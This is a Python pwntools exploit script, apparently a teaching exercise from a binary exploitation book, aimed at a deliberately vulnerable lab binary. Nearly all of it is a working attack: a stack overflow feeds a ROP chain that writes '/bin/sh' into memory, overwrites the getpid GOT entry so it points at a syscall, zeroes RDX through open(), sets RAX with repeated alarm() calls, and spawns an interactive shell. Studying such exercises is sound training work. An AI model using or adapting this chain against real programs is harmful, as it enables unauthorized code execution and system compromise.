################################################################################
# ex2-exploit.py
#   Chapter:01
#   Binary: ex4
#   Source: ex4.c
#   Goal:   spawm a shell by calling execve("/bin/sh\x00",NULL,NULL); No
#           leaks of libc6. Be careful; once you control EIP the value for
#           RDX is 1, which means if you use the same technique as in ex3,
#           you will end up executing execve("/bin/bash\x00",NULL,1), and so
#           the program will crash because char **envp [] points to addr 0x1:
#
#           execve("/bin/sh", NULL, 0x1)            = -1 EFAULT (Bad address)
#
#           So you need to set RDX = 0 by taking advantage of a function
#           side-effect, in this case by calling open(); the register RDX will
#           be set to 0x0!
#
#           This is a technique that may not work for some particular versions
#           of libc6 or systems. Tested on Debian 12 Bookworm with glibc 2.36.
#           libc6:amd64    2.36-9+deb12u3 amd64
################################################################################
from pwn import *

# Binary protections:
# checksec --file ex4
#    Arch:     amd64-64-little
#    RELRO:    Partial RELRO            We can overwrite the got
#    Stack:    No canary found          We can smash the stack as we please
#    NX:       NX enabled               We need ROP (stack is non-executable)
#    PIE:      No PIE (0x400000)        We don't need a memory leak
vuln    =   "./ex4"
binary  =   ELF(vuln)

# We control EIP after padding + RBP:
padding =   b'A'*112
# A fake RBP value:
RBP     =   0xdeadbeefcafebabe

# Using ropper, we find the following ROP-gadgets we will need:
# 0x00000000004011eb: pop rdi; ret; 
# 0x00000000004011ed: pop rsi; ret; 
pop_rdi =   0x04011eb
pop_rsi =   0x04011ed

# We start a local process of the vulnerable program:
r = process(binary.path)

# We want to set RAX to 0x3b; we do not have any ROP-gadget to
# achieve that. Notice that we can set RAX to 0 by returning to
# 0x0040116c:
#   0x000000000040116c: mov eax, 0; leave; ret;
#
# Can we re-purpose any called function from libc6?:
# [0x403fc0] getpid@GLIBC_2.2.5  →  0x7ffff7e78320
# [0x403fc8] memset@GLIBC_2.2.5  →  0x7ffff7ef5fc0
# [0x403fd0] alarm@GLIBC_2.2.5  →  0x7ffff7e76b60
# [0x403fd8] close@GLIBC_2.2.5  →  0x7ffff7e9b7d0
# [ 0x403fe0] gets@GLIBC_2.2.5  →  0x7ffff7e19fa0
# [0x403fe8] open@GLIBC_2.2.5  →  0x7ffff7e9adb0
#
# Yes! alarm(). Because the program sets an alarm to 10 seconds
# we need to disable it first or the program will stop after 10 seconds!
#
# This binary is not PIE; so we can use its addresses right away
# (we don't need a leak)

# The command will end up writing to the .bss segment:
cmd =   b'/bin/sh\x00'

# We need to put "/bin/sh\x00" into rdi. The program calls "memset",
# so we need to write each character at a time into a valid rw-
# section. *mydata seems to be the right place to write to:
cmd_addr    =   binary.symbols["mydata"]
info("We will write /bin/sh into mydata at 0x%02x" % cmd_addr)

rop = b''
# This time, RDX=1 already, so we do not need to set it to 0x1. And, besides,
# we do not have any ROP-gadget to do that!
for i in range(0,len(cmd)):
    rop +=  p64(pop_rdi)
    rop +=  p64(cmd_addr+i)                     # rdi <- &mydata[i]
    rop +=  p64(pop_rsi)
    rop +=  p64(cmd[i])                         # rsi <- char
    rop +=  p64(binary.symbols["plt.memset"])   # memset(&mydata[i],cmd[i],1)

# Please notice that we can also use plt.gets(cmd_addr) in order to write
# any string of our choice into cmd_addr. This way, we do not need to iterate
# and the payload will execute faster.

# Now, where to jump to? We now that alarm()+5 has the opcode "syscall"
# Dump of assembler code for function __GI_alarm:
#   0x00007ffff7e76b60 <+0>:	mov    eax,0x25
#   0x00007ffff7e76b65 <+5>:	syscall
# But of course we cannot overwrite got@alarm() because then we couldn't
# call alarm() to set RAX = 0x3b! We need another function:
# getpid:
#   Dump of assembler code for function __GI_getpid:
#   0x00007ffff7febac0 <+0>:	mov    eax,0x27
#   0x00007ffff7febac5 <+5>:	syscall
#   0x00007ffff7febac7 <+7>:	ret
# This value may vary on your local computer due to a different version of
# libc6. You can use gdb or r2 to find out how far apart "syscall" is from
# the start of getpid(). For example, on libc6 2.35 (Ubuntu Jammy), this value
# is 9 instead of 5:
# ┌ 12: int sym.getpid ();
# │           0x000ec040      f30f1efa       endbr64
# │           0x000ec044      b827000000     mov eax, 0x27               ; '\''
# │           0x000ec049      0f05           syscall        getpid()+9
# └           0x000ec04b      c3             ret
# This kind of tricks are discussed in Chapter 2 of the CreativePwning book.
rop +=  p64(pop_rdi)
rop +=  p64(binary.symbols["got.getpid"])
rop +=  p64(pop_rsi)
rop +=  p64(0x25)       # getpid()+5
# RDX=1 already
# memset(&got.getpid,0x25,1);
rop +=  p64(binary.symbols["plt.memset"])

# Now, we will take advantatge of a libc6 function side-effect to set
# RDX = 0 indirectly. We don't even care if we leave the file opened,
# because we are taking advantatge of a side-effect here!
rop +=  p64(pop_rdi)
rop +=  p64(0x402011)                       # &"/etc/issue"
rop +=  p64(pop_rsi)
rop +=  p64(0x0)                            # rsi <- 0, O_RDONLY
rop +=  p64(binary.symbols["plt.open"])     # open("/etc/issue",0);
# And now, RDX = 0 so we can construct the rest of our attack as in ex3

# Now we disable alarm() and then we call alarm(0x3b) twice, thus
# setting RAX = 0x3b:
rop     +=  p64(pop_rdi)
rop     +=  p64(0x0)                            # rdi <- 0x0
rop     +=  p64(binary.symbols["plt.alarm"])    # alarm(0);

# Now, the alarm is disabled so we can use alarm() again to set
# the value 0x3b into RAX:
rop     +=  p64(pop_rdi)
rop     +=  p64(0x3b)                           # rdi <- 0x3b
rop     +=  p64(binary.symbols["plt.alarm"])    # alarm(0x3b)
rop     +=  p64(pop_rdi)
rop     +=  p64(0x3b)                           # rdi <- 0x3b
rop     +=  p64(binary.symbols["plt.alarm"])    # alarm(0x3b)

# So, at this point, RAX = 0x3b and the new alarm will trigger
# at exactly 59 seconds. Before the alarm triggers, we need
# to set execve() arguments first:
rop     +=  p64(pop_rdi)
rop     +=  p64(cmd_addr)       # rdi <- &"/bin/sh\x00"
rop     +=  p64(pop_rsi)
rop     +=  p64(0x0)            # char **argp[] = NULL;
#   Now, calling getpid@plt() will triger execve():
rop     +=  p64(binary.symbols["plt.getpid"])
r.send(padding + p64(RBP) + rop + b'\x0a')
r.interactive()
r.close()
